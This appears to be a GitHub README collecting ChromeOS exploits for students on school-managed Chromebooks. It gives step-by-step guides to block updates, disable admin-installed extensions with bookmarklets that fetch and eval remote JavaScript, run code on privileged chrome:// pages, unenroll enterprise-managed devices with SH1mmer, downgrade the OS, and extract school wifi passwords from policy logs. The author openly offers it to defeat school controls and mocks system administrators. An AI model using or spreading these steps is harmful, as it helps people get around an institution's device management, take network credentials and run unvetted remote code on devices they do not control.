# EXT-REMOVER
This is a curated list of exploits for ChromeOS. It started with LTBEEF, and now there is more!
Many of these exploits can destory your computer if used inproperly. So PLEASE PLEASE make sure you follow these instructions very carefully!
  
**ATTENTION ALL SYS ADMINS!!!**

Hello, I am Echo and I created this repo in order to give exploits for the masses and to prove one thing, chromebooks are literal trash, and a poor excuse for a computer. They are full of exploits, you might think you blocked/patched them all but then 3 more pop up. It is a endless game of wack-a-mole. Treat your students to a windows computer, they will thank you. And don't you dare start to think "My school district does not have that kind of money", it most likely does! How much are you paying the blocker companies? Think about that.

<img width="250px" src="https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png">  
Image Credit: LittleMissNyan

<details>
<summary><b>CAUB</b> (Prevent Updates)</summary>
This exploit keeps your chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by Catakang#0987. Using onc files, you can convince your chromebook that the wifi that you're connected to is pay-to-use (like a hotspot using data), and thus it will not check for updates.

*Scroll down to preform this exploit!*

![image](https://user-images.githubusercontent.com/58097612/212685932-ef9c802e-6040-42a3-be6e-10997162b7cd.png)

<i>Getting started</i>

1. Go to `chrome://network#state` (on your school chromebook of course; if this is blocked then ur kinda screwed lol).
2. Scroll to the bottom of the page; you should see a list of "favorite" wifis that you've connected to in the past.
3. Click the + sign next to the wifi name of each network that you commonly connect your chromebook to.
4. The more wifis you expand, the better, but note that they have to come from the "favorites" section.
5. Use ctrl+a and ctrl+c to copy all the text on the entire network#state page.
6. Go to [caub.glitch.me](https://caub.glitch.me/).
7. Paste the copied text into the textbox below.
8. Press the "generate onc" button below the textbox.
9. Once you have downloaded the file, go to chrome://network#general
10. Click on the "import onc" button
11. Import the newly downloaded file

Your chromebook will no longer automatically update. (as long as you are on a wifi that you used caub on)

Be careful not to stay on a wifi for too long without using caub on it, otherwise you might update.

We cannot guarantee that this will work on every wifi

</details>

<details>
<summary><b>LTBEEF</b> (Disable extensions)</summary>
LTBEEF is an exploit, created by Bypassi#7037, which abuses api endpoints within the google chrome webstore.  

<b>Please Note:</b> This exploit only works on versions below 106, and eariler versions of 102
  
The origional site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>
  
**Instlation**  
There are several vesions of thisexploit you can use, here are the 2 most common versions:
- *Bookmarklets*  
    To use a GUI, bookmark one of the below scripts:  
    - Ingot  
    ```js
    javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
    ```
    - Compact Cow's UI  
    ```js
    javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
    ```  

    Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. Flip the switches on the extentions you want to disable. Simple!  

    Photos of the GUI's:
    ![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)
    ![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)
   
- *DNS servers*  
    By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
      
    First, go to Settings > Network > Wifi > Network, and click on "Custom Name Servers"
    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)  
    Set every box there to the following ip:  
    ```158.101.114.159``` (Hosted by The Greatest Giant#0110)  
    Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. Flip the switches on the extentions you want to disable. 
</details>  

<details>
<summary><b>Point Blank</b> (Run code on system pages)</summary>
Point Blank is an exploit that allows you to run bookmarklets on privilaged pages, sutch as the chrome extentions page.  
This exploit was also found by Bypassi, you can read more about how he discovered this exploit <a href="https://blog.bypassi.com/_/point-blank/"></a>

1. Bookmark this code:
```js
javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 125);
```
2. Navigate to `chrome://extensions` 
3. Click on a extension that YOU installed from the Chrome Web Store > Details
4. In the URL bar, copy the string of letters and numbers after the `/?id=`
5. Click "View in Chrome Web Store" and spam the excape key. If it loads into chrome webstore try again, if it is a blank screen click the bookmarklet
5. Paste the id of the extension into the prompt. 
If you close the tab, the exploit will stop working.
</details>

<details>
<summary><b>SH1mmer</b> (Unenroll and more)</summary>  
SH1mmer is an explit devloped by the crew at Mercury Workshop. Credits can be found within the menu and on their site.  
This exploit can be used to completely unenroll enterprise-managed Chromebooks.  
  
**PLEASE FOLLOW EVERY DIRECTION!** If you do not, you could brick your chromebook.
  
More info: <a href="https://sh1mmer.me/">https://sh1mmer.me/</a>  
- FAQ: <a href="https://sh1mmer.me/faq.html">https://sh1mmer.me/faq.html</a>
- Credits: <a href="https://sh1mmer.me/credits.html">https://sh1mmer.me/faq.html</a>
  
This exploit works quite like downgrading, but requires a few more steps.  
<i>Requirements</i>  
- A USB with atleast 16gbs
- A personal computer

<i>Setup</i>

1. Navigate to chrome://version on the chromebook you with to downgrade and check for your board under "Platform" (ex I have a c3100 and it's board is stable-channel octopus)  
<img src="https://user-images.githubusercontent.com/88395302/212484378-65e6e6e3-b995-48a1-b229-3265a4993279.png">  
Make sure your board is in this list: `brask, brya, clapper, coral, dedede, enguarde, glimmer, grunt, hana, hatch, jacuzzi, kukui, nami, octopus, orco, pyro, reks, sentry, stout, strongbad, tidus, ultima, volteer, zork` If it is not, then this exploit will not work.

2. - On your personal computer, download the corresponding shim from the SH1MMER file mirror <ahttps://dl.sh1mmer.me/Beautiful%20World%20GUI%20Shims>https://dl.sh1mmer.me/Beautiful World GUI Shims</a>
3. Install Chromebook Recovery Utility onto your personal computer (found at <a href="https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en">https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en</a>  
4. Open the extention, and click on the settings button in to top right hand corner, click "use local image"  
5. Select the .bin file you downloaded

<i>Instlation</i>

1. Enter recovery mode on your Managed Chromebook. This is done by pressing the power button, reload key (↻), and esc key at the same time.
2. Press ctrl+d, then enter
3. It will now say something about "returning to secure mode" or that "OS verification is off", this means ou are ready to boot Sh1mmer. 
4. Press the power button, reload key (↻), and esc key at the same time again.
5. Plug your shimmed USB into your Chromebook, and press the power button, reload key (↻), and esc key again.
6. Navigate to "Payloads", then click on "Unenroll"
7. Nagigate back to the pain page, and click "Reboot"  
Enjoy your new, unenrolled chromebook!
</details>

<details>
<summary><b>Downgrading</b> (Change versions)</summary>  
Downgrading can be used for several exploits, to get to a version that does not have patches for sertain exploits, sutch as LTBEEF. This is a built in feature of ChromeOS.

![image](https://user-images.githubusercontent.com/58097612/212685863-3d6b8ce1-7caa-4735-95a8-8eb6787b227c.png)

<i>Requirements</i>
1. A USB thumb drive with at least 4gb of storage, some board have small or bigger images, so have a beef usb, I recommend 16gb
2. A personal computer with access to downloading extentions
3. A brain

<i>Setup</i>
1. Navigate to chrome://version on the chromebook you with to downgrade and check for your board under "Platform" (ex I have a c3100 and it's board is stable-channel octopus)  
<img src="https://user-images.githubusercontent.com/88395302/212484378-65e6e6e3-b995-48a1-b229-3265a4993279.png">  
2. Navigate to https://chrome100.dev/ , press `ctrl+f` and type in your board
3. Find and download the chrome version you want to your personal computer

<i>Instlation</i>
1. Install Chromebook Recovery Utility onto your personal computer (found at <a href="https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en">https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en</a>
2. Open the extention, and click on the settings button in to top right hand corner, click "use local image"
3. Select the recovery image you downloaded from chrome100
4. Plug in the USB you wish to use, and follow the prompts on the screen
5. On your chromebook, press esc+reload+power and follow the prompts
6. On the checking for updates screen, press ctrl+shift+e to skip the "checking for updates" screen
7. Profi

</details>
  
<details>
<summary><b>Wifi Password</b> (Get school wifi passwords)</summary>
You can get your school's wifi password if it is built into the enrolement!

![image](https://user-images.githubusercontent.com/58097612/212685463-cfd45697-a90f-42dd-8295-2bcdb5edcd4f.png)

*This tool should not be used for illegal activity. By using this tool, you acknowledge that you are legally allowed to extract the password(s) in question.*

1. Visit chrome://net-export
2. In "OPTIONS" set "Include raw bytes"
3. Click "Start Logging to Disk"
4. Visit chrome://policy
5. Click "Reload policies"
6. Go back to chrome://net-export and click "Stop logging"
7. Upload file [here!](https://luphoria.com/netlog-policy-password-tool)
8. Profit
</details>


boop
